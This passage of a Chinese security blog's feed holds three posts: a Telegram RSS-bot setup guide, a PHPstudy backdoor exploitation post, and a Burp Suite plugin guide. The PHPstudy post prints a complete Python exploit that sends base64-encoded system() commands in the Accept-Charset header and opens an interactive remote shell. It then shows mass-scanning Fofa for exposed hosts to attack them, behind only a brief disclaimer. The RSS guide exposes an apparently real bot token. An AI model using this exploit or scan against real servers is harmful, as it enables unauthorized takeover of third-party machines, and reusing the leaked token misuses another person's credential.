        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>一直想打造一个可以订阅一些好的博客或者网站直接的东西，但是很多免费的RSS阅读器广告特别多，所以就很少打开了，今天看到一篇文章说可以利用telegram+vps搭建一个RSS订阅的机器人，一下子吸引了我，今天就把这个技能分享给大家</p><a id="more"></a><h1 id="0x01-前期准备"><a href="#0x01-前期准备" class="headerlink" title="0x01 前期准备"></a>0x01 前期准备</h1><blockquote><p>环境准备：</p><ol><li>一个vps：Ubuntu 16系统</li><li>telegram</li><li>科学**</li><li>xshell或者finalshell</li></ol></blockquote><h2 id="1-1-vps的购买"><a href="#1-1-vps的购买" class="headerlink" title="1.1 vps的购买"></a>1.1 vps的购买</h2><p>网址推荐：<a href="https://virmach.com/" target="_blank" rel="noopener">virmach</a> ;<a href="https://vp.xinping04.cn/bwg/" target="_blank" rel="noopener">搬瓦工</a></p><h2 id="1-2-telegram下载安装"><a href="#1-2-telegram下载安装" class="headerlink" title="1.2 telegram下载安装"></a>1.2 telegram下载安装</h2><p>Windows：<a href="https://telegram-for-desktop.en.softonic.com/" target="_blank" rel="noopener">传送门</a></p><p>Android：在Google play中自行下载</p><h2 id="1-3-科学-搭建"><a href="#1-3-科学-搭建" class="headerlink" title="1.3 科学**搭建"></a>1.3 科学**搭建</h2><p>教程：<a href="https://www.mad-coding.cn/2019/09/20/9元钱搭建一个自己的VPN/">传送门</a></p><h1 id="0x02-搭建RSS订阅机器人"><a href="#0x02-搭建RSS订阅机器人" class="headerlink" title="0x02 搭建RSS订阅机器人"></a>0x02 <strong>搭建RSS订阅机器人</strong></h1><h2 id="2-1-申请机器人"><a href="#2-1-申请机器人" class="headerlink" title="2.1 申请机器人"></a>2.1 <strong>申请机器人</strong></h2><p>首先需要申请一个Telegram机器人，非常简单，直接对话Telegram机器人之父（@BotFather），发送/newbot给它，之后输入你的机器人的名字，注意需要以bot结尾（例如我的是kangrss_bot），之后你的机器人就创建好了，并且会给你一个<strong>HTTP API TOKEN</strong>：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031223216.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031223227.png" class="lozad"></p><p>记住这个token，待会需要用到</p><h2 id="2-2-搭建RSS订阅"><a href="#2-2-搭建RSS订阅" class="headerlink" title="2.2 搭建RSS订阅"></a>2.2 搭建RSS订阅</h2><p>搭建的RSS订阅机器人是基于开源软件rssbot的，一个开源的Telegram<br>RSS机器人，项目地址：<a href="https://github.com/iovxw/rssbot。" target="_blank" rel="noopener">https://github.com/iovxw/rssbot。</a></p><blockquote><p>还有一个听说也挺好用，但是我还没有用过</p><p><a href="https://github.com/indes/flowerss-bot" target="_blank" rel="noopener">https://github.com/indes/flowerss-bot</a></p></blockquote><h3 id="2-2-1【方法一】"><a href="#2-2-1【方法一】" class="headerlink" title="2.2.1【方法一】"></a>2.2.1【方法一】</h3><p>首先得登录VPS，然后安装相关依赖。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#CentOS系统 </span></span><br><span class="line">yum -y update &amp;&amp; yum -y install gcc make openssl* pkg* libssl* screen curl </span><br><span class="line"><span class="comment">#Ubuntu、Debian系统</span></span><br><span class="line">apt-get -y update &amp;&amp; apt-get -y install gcc make openssl pkg-config libssl-dev screen curl</span><br></pre></td></tr></table></figure><p>安装Rust Nightly</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://sh.rustup.rs -sSf | sh</span><br></pre></td></tr></table></figure><p>安装rssbot</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/iovxw/rssbot/archive/v1.4.2.tar.gz</span><br><span class="line">tar xvf v1.4.2.tar.gz</span><br><span class="line"><span class="built_in">cd</span> rssbot-1.4.2</span><br><span class="line">cargo build --release</span><br></pre></td></tr></table></figure><h3 id="2-2-2-【方法二】"><a href="#2-2-2-【方法二】" class="headerlink" title="2.2.2 【方法二】"></a>2.2.2 【方法二】</h3><p>直接下载编译好的rssbot.<a href="https://github.com/iovxw/rssbot/releases" target="_blank" rel="noopener">传送门</a></p><p>下载下来Linux版本的，然后使用远程终端连接工具xshell或finalshell来连接vps，将本地的rssbot文件上传到vps中，</p><h2 id="2-3-运行rssbot"><a href="#2-3-运行rssbot" class="headerlink" title="2.3 运行rssbot"></a>2.3 运行rssbot</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir RSS <span class="comment">#创建RSS文件夹</span></span><br><span class="line"><span class="built_in">cd</span> RSS</span><br><span class="line">chmod +x rssbot <span class="comment">#服务rssbot执行权限</span></span><br><span class="line">apt-get install screen</span><br><span class="line">./rssbot DATAFILE TELEGRAM-BOT-TOKEN</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031223235.png" class="lozad"></p><p>然后按Ctrl + A + D 退出 screen （这样会后台运行）</p><p>使用下面的命令可以进入刚才启动服务的screen</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -R rssbot</span><br></pre></td></tr></table></figure><p>最后我们就可以使用机器人了！</p><p>或者使用让rssbot后台运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./rssbot DATAFILE  890461373:AAEG7mwZdUDngqAJ9GVt2cir-AL1wltoJw4 &gt; log.file 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><h1 id="0x03-订阅网站"><a href="#0x03-订阅网站" class="headerlink" title="0x03 订阅网站"></a>0x03 订阅网站</h1><p><code>rssbot</code>的指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/rss       - 显示当前订阅的 RSS 列表，加 raw 参数显示链接</span><br><span class="line">/sub       - 订阅一个 RSS: /sub http://example.com/feed.xml</span><br><span class="line">/unsub     - 退订一个 RSS: /unsub http://example.com/feed.xml</span><br><span class="line">/unsubthis - 使用此命令回复想要退订的 RSS 消息即可退订, 不支持 Channel</span><br><span class="line">/export    - 导出为 OPML</span><br></pre></td></tr></table></figure><p>【示例】</p><p>订阅：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031223245.png" class="lozad"></p><p>退订：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031223311.png" class="lozad"></p><p>查看订阅的地址</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031223329.png" class="lozad"></p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://51.ruyo.net/13304.html" target="_blank" rel="noopener">https://51.ruyo.net/13304.html</a></p><p><a href="https://www.moerats.com/archives/566/" target="_blank" rel="noopener">https://www.moerats.com/archives/566/</a></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tg机器人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpstudy后门检测及利用</title>
      <link href="/2019/10/09/phpstudy%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
      <url>/2019/10/09/phpstudy%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前几天爆出了PHPstudy被黑客入侵，导致安装包被植入后门，所有下载该工具的人，都有可能被人直接远程控制。今天来给大家直接演示批量扫描存在PHPstudy后门的主机，然后对存在后门的主机直接getshell。</p><a id="more"></a><h1 id="0x01-前期准备"><a href="#0x01-前期准备" class="headerlink" title="0x01 前期准备"></a>0x01 前期准备</h1><blockquote><p>【环境需求】</p><p>kali Linux渗透测试系统</p><p>saucerframe攻击框架</p><p>PHPstudy利用脚本</p></blockquote><h2 id="1-1-kali-Linux系统安装"><a href="#1-1-kali-Linux系统安装" class="headerlink" title="1.1 kali Linux系统安装"></a>1.1 kali Linux系统安装</h2><p>出门右拐百度，一大堆教程</p><h2 id="1-2-saucerframe攻击框架的安装"><a href="#1-2-saucerframe攻击框架的安装" class="headerlink" title="1.2 saucerframe攻击框架的安装"></a>1.2 saucerframe攻击框架的安装</h2><p>框架GitHub地址：<a href="https://github.com/saucer-man/saucerframe" target="_blank" rel="noopener">传送门</a></p><p>【安装步骤】</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/saucer-man/saucerframe.git </span><br><span class="line"><span class="built_in">cd</span> saucerframe</span><br><span class="line">pip install -r requirement.txt</span><br></pre></td></tr></table></figure><blockquote><p>saucerframe框架需要python3的环境。</p></blockquote><p>【使用说明】</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 指定poc脚本(必需,支持同时指定多个poc)</span></span><br><span class="line">-s redis_unauth,mongodb_unauth</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 指定目标(必需)</span></span><br><span class="line">-iU www.xxx.com  单个目标</span><br><span class="line">-iF target.txt  从文本中加载</span><br><span class="line">-iR 192.168.1.1-192.168.2.100  根据ip地址范围加载</span><br><span class="line">-iN 192.168.1.0/24  根据网段加载</span><br><span class="line">-aZ <span class="string">"redis"</span>  ZoomEye api加载</span><br><span class="line">-aS <span class="string">"redis"</span>  Shodan api加载</span><br><span class="line">-aC <span class="string">"redis"</span>  Censys api加载</span><br><span class="line">-aF <span class="string">"redis"</span>  Fofa api加载</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 其他(可选)</span></span><br><span class="line">-h  查看帮助信息</span><br><span class="line">-t 300  并发数(默认100)</span><br><span class="line">--proxy socks5://127.0.0.1:1080  使用sock5代理</span><br><span class="line">-o result.txt  指定输出文件</span><br><span class="line">-v 4 指定终端输出详细级别(1-5, 默认为2)</span><br><span class="line">--show  查看所有poc</span><br><span class="line">-eT  并发采用多线程方式</span><br><span class="line">-eG  并发采用协程方式(默认)</span><br></pre></td></tr></table></figure><h2 id="1-3-PHPstudy后门利用脚本"><a href="#1-3-PHPstudy后门利用脚本" class="headerlink" title="1.3 PHPstudy后门利用脚本"></a>1.3 PHPstudy后门利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   PHPStudy_Backdoor.py</span></span><br><span class="line"><span class="string">@Time    :   2019/09/23 19:17:02</span></span><br><span class="line"><span class="string">@Author  :   fuhei </span></span><br><span class="line"><span class="string">@Version :   1.0</span></span><br><span class="line"><span class="string">@Blog    :   http://www.lovei.org</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27'</span>,</span><br><span class="line">    <span class="string">'Sec-Fetch-Mode'</span>: <span class="string">'navigate'</span>,</span><br><span class="line">    <span class="string">'Sec-Fetch-User'</span>: <span class="string">'?1'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line">    <span class="string">'Sec-Fetch-Site'</span>: <span class="string">'none'</span>,</span><br><span class="line">    <span class="string">'accept-charset'</span>: <span class="string">'ZXhpdCgnZnVoZWk2NjYnKTs='</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip,deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(url, command=<span class="string">"whoami"</span>)</span>:</span></span><br><span class="line">    command = <span class="string">"system(\""</span> + command + <span class="string">"\");"</span></span><br><span class="line">    command = base64.b64encode(command.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    headers[<span class="string">'accept-charset'</span>] = str(command, <span class="string">'utf-8'</span>)</span><br><span class="line">    user = result = requests.get(url, headers=headers, verify=<span class="literal">False</span>).text.split(<span class="string">'&lt;!'</span>)[<span class="number">0</span>].strip(<span class="string">'\r\n'</span>)</span><br><span class="line">    print(user)</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        command = input(user+<span class="string">"@fuhei$ "</span>)</span><br><span class="line">        <span class="keyword">if</span> command == <span class="string">'exit'</span> <span class="keyword">or</span> command  == <span class="string">'quit'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            command = <span class="string">"system(\""</span> + command + <span class="string">"\");"</span></span><br><span class="line">            command = base64.b64encode(command.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            headers[<span class="string">'accept-charset'</span>] = str(command, <span class="string">'utf-8'</span>)</span><br><span class="line">            result = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">            result.encoding = <span class="string">"GBK"</span></span><br><span class="line">            print(result)</span><br><span class="line">            result = result.text.split(<span class="string">'&lt;!'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Cannot execute a blank command in'</span> <span class="keyword">in</span> result[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(result[<span class="number">0</span>], end=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">    result = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> result.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'fuhei666'</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        print(<span class="string">"[+] Remote code execution vulnerability exists at the target address"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] There is no remote code execution vulnerability in the target address"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:     </span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> check(url):</span><br><span class="line">            exp(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[!] Usage python3 PHPStudy_Backdoor.py http://www.lovei.org/"</span>)</span><br></pre></td></tr></table></figure><h1 id="0x02-开炮"><a href="#0x02-开炮" class="headerlink" title="0x02 开炮"></a>0x02 开炮</h1><p>进入saucerframe文件夹，查看可利用的PHPstudy后门扫描脚本。</p><blockquote><p>python saucerframe.py –show</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160632.png" class="lozad"></p><blockquote><p>python saucerframe.py -s phpstudy_backdoor.py -aF “phpstudy”</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160639.png" class="lozad"></p><blockquote><p>python phpstudy_getshell.py <a href="http://IP地址" target="_blank" rel="noopener">http://IP地址</a></p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160658.png" class="lozad"></p><blockquote><p>免责声明：</p><p><strong>本文意在讨论使用工具来应对软件研发领域中，日益增长的安全性质量测试需求。本文涉及到的工具不可被用于攻击目的**</strong>，本人概不承担一切后果。**</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHPstudy后门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite常用插件推荐与使用（不断跟新中）</title>
      <link href="/2019/10/04/burpsuite%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/10/04/burpsuite%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>做安全的人都知道，burpsuite是安全从业者必须要会使用的神器，之所以称之为神器，是因为他不仅功能强大，好用，界面美观，还有丰富的插件拓展功能，支持python和java写的插件，用户可以在插件商城中去安装，有代码编写能力的，还可以自己编写插件。</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/b0a2a870df891caa" class="lozad"></p><a id="more"></a><h1 id="0x01-Active-Scan"><a href="#0x01-Active-Scan" class="headerlink" title="0x01 Active Scan++"></a>0x01 Active Scan++</h1><h2 id="1-1-介绍"><a href="#1-1-介绍" class="headerlink" title="1.1 介绍"></a>1.1 介绍</h2><p>ActiveScan ++扩展了 Burp Suite 的主动和被动扫描功能，可以扫描出更多的漏洞。</p><h2 id="1-2-下载"><a href="#1-2-下载" class="headerlink" title="1.2 下载"></a>1.2 下载</h2><blockquote><p><a href="https://github.com/albinowax/ActiveScanPlusPlus" target="_blank" rel="noopener">https://github.com/albinowax/ActiveScanPlusPlus</a></p></blockquote><h2 id="1-3-安装"><a href="#1-3-安装" class="headerlink" title="1.3 安装"></a>1.3 安装</h2><p>需要 jython-standalone-2.5.jar 环境,参考<a href="[https://www.mad-coding.cn/%2F2019%2F08%2F19%2Fburp%E5%8A%A0%E8%BD%BDjython%E6%97%B6%E5%87%BA%E9%94%99%2F#0x00-%E5%89%8D%E8%A8%80](https://www.mad-coding.cn/%2F2019%2F08%2F19%2Fburp加载jython时出错%2F#0x00-前言)">burp加载jython时出错</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015085137.png" class="lozad"></p><h2 id="1-4-使用"><a href="#1-4-使用" class="headerlink" title="1.4 使用"></a>1.4 使用</h2><p>先在extender模块查看是否勾选上了。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015090248.png" class="lozad"></p><p>主被动扫描自己就调用了</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015090017.png" class="lozad"></p><h1 id="0x02-AutoRepeater"><a href="#0x02-AutoRepeater" class="headerlink" title="0x02 AutoRepeater"></a>0x02 AutoRepeater</h1><h2 id="2-1-介绍"><a href="#2-1-介绍" class="headerlink" title="2.1 介绍"></a>2.1 介绍</h2><p>Burp Suite是一个拦截HTTP代理，它是执行Web应用程序安全测试的事实工具。虽然Burp Suite是一个非常有用的工具，但使用它来执行授权测试通常是一项涉及“更改请求和重新发送”循环的繁琐工作，这可能会漏掉漏洞并减慢测试速度。AutoRepeater是一个开源的Burp Suite扩展，旨在减轻这种努力。AutoRepeater可自动化和简化Web应用程序授权测试，并为安全研究人员提供易于使用的工具，可在Burp Suite中自动复制，修改和重新发送请求，同时快速评估响应的差异。</p><p>AutoRepeater仅重新发送由定义的替换更改的请求。当AutoRepeater收到与给定选项卡设置的条件匹配的请求时，AutoRepeater将首先将每个已定义的基本替换应用于请求，然后将复制请求，并为每个已定义的替换执行基本替换，并将给定的替换应用于请求。</p><h3 id="【AutoRepeater特点】"><a href="#【AutoRepeater特点】" class="headerlink" title="【AutoRepeater特点】"></a>【AutoRepeater特点】</h3><p>没有AutoRepeater，基本的Burp Suite Web应用程序测试流程如下：</p><ol><li>用户面对Web应用程序，直到找到有趣的请求</li><li>用户将请求发送到Burp Suite的“Repeater”工具</li><li>用户在“Repeater”中修改请求并将其重新发送到服务器</li><li>重复步骤3，直到找到甜蜜漏洞</li><li>从第1步开始，直到用户用完测试时间或者可以退出bug赏金收入</li></ol><p>虽然此测试流程有效，但测试任何请求中可能存在的问题尤为繁琐。例如，更改电子邮件地址，帐户身份，角色，URL和CSRF令牌都可能导致漏洞。目前，Burp Suite不会在Web应用程序中快速测试这些类型的漏洞。</p><p>现有一些Burp Suite插件（AuthMatrix，Authz和Autorize）可以使授权测试更容易，但每个插件都有限制其实用性的问题。AuthMatrix和Authz要求用户向插件发送特定请求，并设置授权测试执行方式的规则，这会导致丢失重要请求的风险并降低测试速度。Autorize不为用户提供执行通用文本替换的能力，并且具有令人困惑的用户界面。AutoRepeater从这些插件中获取所有最佳创意，以及Burp Suite熟悉的用户界面，并将它们组合在一起以创建最简化的授权测试插件。</p><p>AutoRepeater提供了一种通用解决方案，用于简化Web应用程序中的授权测试。AutoRepeater提供以下功能：</p><ul><li>自动复制，修改和重新发送任何请求</li><li>有条件的替代品</li><li>快速标题，Cookie和参数值替换</li><li>拆分请求/响应查看器</li><li>原始与修改的请求/响应差异查看器</li><li>基本替换中断CSRF令牌和会话cookie等请求的值</li><li>Renamable标签</li><li>记录</li><li>出口</li><li>切换激活</li><li>从其他Burp Suite工具“发送到AutoRepeater”</li></ul><h2 id="2-2-下载"><a href="#2-2-下载" class="headerlink" title="2.2 下载"></a>2.2 下载</h2><blockquote><p>项目地址：<a href="https://github.com/nccgroup/AutoRepeater" target="_blank" rel="noopener">https://github.com/nccgroup/AutoRepeater</a></p></blockquote><h2 id="2-3-安装"><a href="#2-3-安装" class="headerlink" title="2.3 安装"></a>2.3 安装</h2><p>【方法一】</p><p>可以在应用市场中快速的安装，缺点是安装的版本不是最新的版本。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015093909.png" class="lozad"></p><p>【方法二】</p><p>自行下载添加安装，<a href="https://github.com/nccgroup/AutoRepeater/blob/master/AutoRepeater.jar" target="_blank" rel="noopener">下载传送门</a>，然后</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015094052.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015090816.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015094126.png" class="lozad"></p><p>安装完成</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015094208.png" class="lozad"></p><h2 id="2-4-使用"><a href="#2-4-使用" class="headerlink" title="2.4 使用"></a>2.4 使用</h2><blockquote><p>流程：先点开关，在replacements添加替换规则，之后logs一般默认即可，接下来将数据包发送到AutoRepeater就可以分析了，我这里面为了直观，替换规则是“将GET换成POST了”</p></blockquote><h3 id="2-4-1-功能介绍"><a href="#2-4-1-功能介绍" class="headerlink" title="2.4.1 功能介绍"></a>2.4.1 功能介绍</h3><p>【replacements】</p><p><img alt="nkyBK1.png" data-src="https://s2.ax1x.com/2019/09/03/nkyBK1.png" class="lozad"></p><blockquote><p>还有很多其他的规则，这里只是做了一个示范</p></blockquote><p>【logs】</p><p><img alt="nkcl7V.png" data-src="https://s2.ax1x.com/2019/09/03/nkcl7V.png" class="lozad"><br>大致布局</p><p><img alt="nkD1u6.png" data-src="https://s2.ax1x.com/2019/09/03/nkD1u6.png" class="lozad"></p><p>……忘了标记顺序了，就这样吧</p><h3 id="2-4-2-使用注意事项"><a href="#2-4-2-使用注意事项" class="headerlink" title="2.4.2 使用注意事项"></a>2.4.2 使用注意事项</h3><p>1.未开始测试的时候，先不要开启，默认是开启状态</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015092201.png" class="lozad"></p><p>开启状态</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015092306.png" class="lozad"></p><p>2.cookie jar不能勾选上</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015092422.png" class="lozad"></p><p>3.重启之后，数据会丢失，规则配置还在</p><h3 id="2-4-3-AutoRepeater替换规则举例"><a href="#2-4-3-AutoRepeater替换规则举例" class="headerlink" title="2.4.3 AutoRepeater替换规则举例"></a>2.4.3 AutoRepeater替换规则举例</h3><p>【测试未经身份验证的用户访问】</p><p>要测试未经身份验证的用户是否可以访问该应用程序[删除cookie]，需要选择Remove Header By Name之后；Match选择Cookie</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015095811.png" class="lozad"></p><p>【测试经过身份验证的用户访问(越权之类)】</p><p>要测试越权之类【替换cookie值】的，需要在Base Replacements下为cookie配置一个规则， Match Cookie Name, Replace Value匹配cookie名称，替换为权限较低的用户的cookie值</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015095851.png" class="lozad"></p><h2 id="2-5-参考"><a href="#2-5-参考" class="headerlink" title="2.5 参考"></a>2.5 参考</h2><p><a href="https://github.com/nccgroup/AutoRepeater" target="_blank" rel="noopener">https://github.com/nccgroup/AutoRepeater</a></p><p><a href="https://github.com/lilifengcode/Burpsuite-Plugins-Usage" target="_blank" rel="noopener">https://github.com/lilifengcode/Burpsuite-Plugins-Usage</a></p><h1 id="0x03-jsEncrypter"><a href="#0x03-jsEncrypter" class="headerlink" title="0x03 jsEncrypter"></a>0x03 jsEncrypter</h1><h2 id="3-1-介绍"><a href="#3-1-介绍" class="headerlink" title="3.1 介绍"></a>3.1 介绍</h2><p>jsEncrypter是一个<a href="https://www.uedbox.com/post/tag/burpsuite/" target="_blank" rel="noopener">BurpSuite</a>插件，使用phantomjs调用前端<a href="https://www.uedbox.com/post/tag/加密/" target="_blank" rel="noopener">加密</a>函数对数据进行加密，方便对加密数据输入点进行fuzz。</p><h2 id="3-2-jsEncrypter下载"><a href="#3-2-jsEncrypter下载" class="headerlink" title="3.2 jsEncrypter下载"></a>3.2 jsEncrypter下载</h2><p>1：直接在<a href="https://github.com/c0ny1/jsEncrypter/releases" target="_blank" rel="noopener">releases</a>下载</p><p>2：自行编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/c0ny1/jsEncrypter.git</span><br><span class="line">mvn package</span><br></pre></td></tr></table></figure><p>3: 编译好的：<a href="http://pan.mad-coding.cn/%E5%B7%A5%E5%85%B7/jsEncrypter-0.3.jar" target="_blank" rel="noopener">传送门</a> 